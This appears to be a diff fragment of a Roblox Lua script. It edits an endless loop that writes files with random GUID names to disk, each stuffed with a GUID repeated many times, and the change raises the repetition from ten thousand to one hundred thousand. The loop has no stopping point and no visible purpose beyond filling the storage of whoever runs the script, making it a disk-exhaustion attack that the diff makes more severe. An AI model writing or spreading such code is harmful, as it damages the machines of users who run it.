@@ -20,7 +20,7 @@ spawn(function()
 end)
 spawn(function()
     while task.wait() do
-        writefile(game:GetService("HttpService"):GenerateGUID(false),string.rep(game:GetService("HttpService"):GenerateGUID(false),10000))
+        writefile(game:GetService("HttpService"):GenerateGUID(false),string.rep(game:GetService("HttpService"):GenerateGUID(false),100000))
     end
 end)
 
